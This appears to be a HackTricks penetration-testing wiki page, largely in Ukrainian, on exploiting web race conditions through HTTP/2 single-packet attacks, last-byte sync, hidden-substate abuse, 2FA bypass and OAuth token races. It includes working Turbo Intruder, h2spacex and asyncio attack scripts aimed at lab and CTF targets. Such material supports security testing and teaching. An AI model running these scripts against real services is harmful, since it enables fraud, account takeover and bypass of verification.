# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Щоб отримати глибоке розуміння цієї техніки, перегляньте оригінальний звіт за адресою [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Посилення атак Race Condition

Головна перешкода в реалізації race condition — це забезпечити обробку кількох запитів одночасно з дуже малою різницею в часі обробки — ідеально менше 1ms.

Тут наведено кілька технік для синхронізації запитів:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Дозволяє відправляти два запити по одному TCP-з'єднанню, зменшуючи вплив мерехтіння мережі. Однак через варіації на стороні сервера двох запитів може бути недостатньо для стабільної експлуатації race condition.
- **HTTP/1.1 'Last-Byte Sync'**: Дає змогу попередньо відправити більшість частин 20–30 запитів, утримуючи невеликий фрагмент, який потім відправляється разом, забезпечуючи одночасне надходження на сервер.

Підготовка для Last-Byte Sync включає:

1. Відправлення заголовків і тіла без останнього байта без завершення потоку.
2. Пауза на ~100ms після початкової відправки.
3. Вимкнення TCP_NODELAY для використання алгоритму Nagle для пакетування останніх фреймів.
4. Пінгування для «прогріву» з'єднання.

Подальша відправка утримуваних фреймів має призвести до їхнього надходження в одному пакеті — це можна перевірити у Wireshark. Цей метод не застосовується до статичних файлів, які зазвичай не залучені в RC attacks.

### Адаптація до архітектури сервера

Розуміння архітектури цілі критично важливе. Front-end servers можуть маршрутизувати запити по-різному, що впливає на таймінг. Попереднє «прогрівання» з'єднання на стороні сервера за допомогою незначних запитів може нормалізувати час обробки запитів.

#### Обробка блокування на основі сесій

Фреймворки, як-от PHP's session handler, серіалізують запити за сесією, що може приховувати вразливості. Використання різних session tokens для кожного запиту може обійти цю проблему.

#### Подолання обмежень швидкості або ресурсів

Якщо прогрівання з'єднань неефективне, навмисне викликання затримок через обмеження швидкості або ресурсів веб-серверів шляхом потоку фіктивних запитів може сприяти single-packet attack, індукуючи на стороні сервера затримку, сприятливу для race conditions.

## Приклади атак

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Ви можете надіслати запит у Turbo intruder (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), змінити в запиті значення, яке хочете brute force для **`%s`**, як у `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`, а потім вибрати **`examples/race-single-packer-attack.py`** із випадаючого списку:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Якщо ви збираєтеся відправляти різні значення, можна змінити код цим варіантом, який використовує wordlist з буфера обміну:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Якщо веб-сайт не підтримує HTTP2 (лише HTTP1.1), використовуйте `Engine.THREADED` або `Engine.BURP` замість `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: У випадку, якщо потрібно відправити запит до 1 endpoint, а потім кілька запитів до інших endpoint'ів, щоб викликати RCE, ви можете змінити скрипт `race-single-packet-attack.py` на щось на кшталт:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Також доступно в **Repeater** через нову опцію '**Send group in parallel**' у Burp Suite.
- Для **limit-overrun** ви можете просто додати в групу **той самий запит 50 разів**.
- Для **connection warming** ви можете **додати** на **початку** **групи** кілька **запитів** до якоїсь нестатичної частини веб-сервера.
- Для **delaying** процесу **між** обробкою **одного запиту і іншого** у двоетапному процесі ви можете **додати додаткові запити між** обома запитами.
- Для **multi-endpoint** RC ви можете почати надсилати **запит**, який **попадає в прихований стан**, а потім **50 запитів** одразу після нього, які **експлуатують прихований стан**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Автоматизований python-скрипт**: Мета цього скрипта — змінити email користувача, постійно перевіряючи його, поки токен підтвердження нового email не надійде на останню пошту (це сталося через те, що в коді виявлявся RC, де можна було змінити email, але підтвердження відправлялося на старий, бо змінна, яка вказує email, вже була заповнена першим).\
Коли в отриманих email знаходиться слово "objetivo", ми знаємо, що отримали токен підтвердження зміненого email і завершимо атаку.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: engine and gating notes

- Engine selection: use `Engine.BURP2` on HTTP/2 targets to trigger the single‑packet attack; fall back to `Engine.THREADED` or `Engine.BURP` for HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: queue many copies with `gate='race1'` (or per‑attempt gates), which withholds the tail of each request; `openGate('race1')` flushes all tails together so they arrive nearly simultaneously.
- Diagnostics: negative timestamps in Turbo Intruder indicate the server responded before the request was fully sent, proving overlap. This is expected in true races.
- Connection warming: send a ping or a few harmless requests first to stabilise timings; optionally disable `TCP_NODELAY` to encourage batching of the final frames.


### Improving Single Packet Attack

У первинному дослідженні пояснюється, що ця атака має обмеження в 1,500 байт. Проте, в [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), було пояснено, як можна розширити обмеження в 1,500 байт single packet attack до **65,535 B window limitation of TCP by using IP layer fragmentation** (splitting a single packet into multiple IP packets) і відправляти їх у різному порядку, що дозволяє запобігти збиранню пакета, поки всі фрагменти не дістались до сервера. Ця техніка дозволила досліднику відправити 10,000 запитів приблизно за 166ms.

Зверніть увагу, що хоча це покращення робить атаку більш надійною в RC, яка вимагає сотень/тисяч пакетів дістатися одночасно, воно також може мати програмні обмеження. Деякі популярні HTTP-сервери, такі як Apache, Nginx і Go, мають суворе налаштування `SETTINGS_MAX_CONCURRENT_STREAMS` на 100, 128 і 250 відповідно. Проте інші, як NodeJS і nghttp2, мають його необмеженим.\
Це фактично означає, що Apache розглядатиме лише 100 HTTP-з'єднань з одного TCP-з'єднання (обмежуючи цю RC-атаку).

Приклади використання цієї техніки можна знайти в репозиторії [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Before the previous research these were some payloads used which just tried to send the packets as fast as possible to cause a RC.

- **Repeater:** Перегляньте приклади з попереднього розділу.
- **Intruder**: Відправте **request** до **Intruder**, встановіть **number of threads** на **30** в меню **Options**, виберіть як payload **Null payloads** і згенеруйте **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Методологія RC**

### Перевищення ліміту / TOCTOU

Це найпростіший тип race condition, де **vulnerabilities** з'являються у місцях, які **обмежують кількість разів, коли ви можете виконати дію**. Наприклад, використання одного й того ж промокоду у веб-магазині кілька разів. Дуже простий приклад можна знайти в [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) або в [**this bug**](https://hackerone.com/reports/759247)**.**

Існує багато варіацій такого типу атаки, зокрема:

- Повторне використання подарункової картки кілька разів
- Оцінювання продукту кілька разів
- Зняття або переказ коштів понад залишок на рахунку
- Повторне використання одного рішення CAPTCHA
- Обхід обмеження швидкості (rate limit), що захищає від brute-force

### **Приховані підстани**

Експлуатація складних race conditions часто передбачає використання коротких можливостей для взаємодії з прихованими або **непередбаченими підстанами машини**. Ось як до цього підходити:

1. **Виявлення потенційних прихованих підстан**
- Почніть з виявлення endpoints, які змінюють або взаємодіють з критичними даними, такими як профілі користувачів або процеси скидання пароля. Звертайте увагу на:
- **Storage**: Напрямляйтеся до endpoints, які маніпулюють серверними персистентними даними, а не тими, що обробляють дані на стороні клієнта.
- **Action**: Шукайте операції, які змінюють існуючі дані — вони частіше створюють умови, що піддаються експлуатації, порівняно з операціями додавання нових даних.
- **Keying**: Успішні атаки зазвичай включають операції, прив'язані до одного і того ж ідентифікатора, наприклад username або reset token.
2. **Проведення початкового зондування**
- Тестуйте виявлені endpoints за допомогою атак на race condition, спостерігаючи за будь-якими відхиленнями від очікуваної поведінки. Несподівані відповіді або зміни у поведінці застосунку можуть вказувати на вразливість.
3. **Демонстрація вразливості**
- Звузьте атаку до мінімальної кількості запитів, необхідних для експлуатації вразливості, часто це всього два запити. Цей крок може вимагати кількох спроб або автоматизації через точність таймінгу.

### Часочутливі атаки

Точність у таймінгу запитів може виявити вразливості, особливо коли для security tokens використовуються передбачувані методи, як-от timestamps. Наприклад, генерація password reset tokens на основі timestamps може дозволити отримати ідентичні tokens для одночасних запитів.

**Щоб експлуатувати:**

- Використовуйте точний таймінг, наприклад single packet attack, щоб виконати одночасні password reset запити. Ідентичні tokens вказують на вразливість.

**Приклад:**

- Запитайте два password reset tokens одночасно і порівняйте їх. Якщо токени співпадають — це вказує на помилку в генерації токенів.

**Перегляньте** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **щоб спробувати це.**

## Кейси прихованих підстан

### Оплатити та додати товар

Перегляньте [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) щоб побачити, як **оплатити** у магазині та **додати додатковий** товар, за який **не доведеться платити**.

### Підтвердження інших email

Ідея полягає в тому, щоб **підтвердити email-адресу і одночасно змінити її на іншу**, щоб з'ясувати, чи платформа підтверджує нову зміну.

### Зміна email на 2 адреси на основі Cookie

Згідно з [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab була вразлива до takeover таким чином, бо могла **відправити email verification token одного email іншому email**.

**Перегляньте** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **щоб спробувати це.**

### Приховані стани бази даних / Обхід підтвердження

Якщо для додавання інформації в **database** використовуються **2 різні записи**, існує невеликий проміжок часу, коли в базі даних записані **тільки перші дані**. Наприклад, при створенні користувача **username** і **password** можуть бути записані, а **потім token** для підтвердження новоствореного облікового запису записується пізніше. Це означає, що протягом невеликого проміжку часу **token для підтвердження облікового запису є null**.

Тому **реєстрація облікового запису та відправка кількох запитів з пустим token** (`token=` або `token[]=` або будь-який інший варіант) для негайного підтвердження може дозволити **підтвердити обліковий запис**, де ви не контролюєте email.

**Перегляньте** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **щоб спробувати це.**

### Обхід 2FA

Наведений pseudo-code вразливий до race condition, тому що в дуже короткий проміжок часу **2FA не застосовується**, поки створюється session:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 eternal persistence

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Ці сервіси дозволяють створити application та автентифікувати користувачів, зареєстрованих у провайдера. Щоб це зробити, **клієнт** повинен **дозволити вашому додатку** доступ до частини їхніх даних всередині **OAUth provider**.\
Отже, до цього моменту це просто звичайний вхід через google/linkedin/github..., де вам показують сторінку з повідомленням: _Application \<InsertCoolName> wants to access your information, do you want to allow it?_

#### Race Condition in `authorization_code`

The **problem** appears when you **accept it** and automatically sends an **`authorization_code`** to the malicious application. Потім цей application зловживає Race Condition у OAUth service provider, щоб згенерувати більше ніж один AT/RT (Authentication Token/Refresh Token) з `authorization_code` для вашого облікового запису. По суті, воно зловживає тим, що ви дозволили додатку доступ до ваших даних, щоб **створити кілька облікових записів**. Якщо ви перестанете дозволяти додатку доступ до ваших даних, одна пара AT/RT буде видалена, але інші залишаться дійсними.

#### Race Condition in `Refresh Token`

Once you have **obtained a valid RT** you could try to **abuse it to generate several AT/RT** and **even if the user cancels the permissions** for the malicious application to access his data, **several RTs will still be valid.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.
- Використовуючи Burp’s WebSocket Turbo Intruder, ви можете застосувати рушій **THREADED** для створення кількох WS-з’єднань та одночасного відправлення payloads. Почніть з офіційного прикладу та налаштуйте `config()` (кількість потоків) для досягнення конкурентності; це часто надійніше, ніж відправка пакетів по одному з'єднанню при змаганні за стан на стороні сервера між WS-обробниками. Див. [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
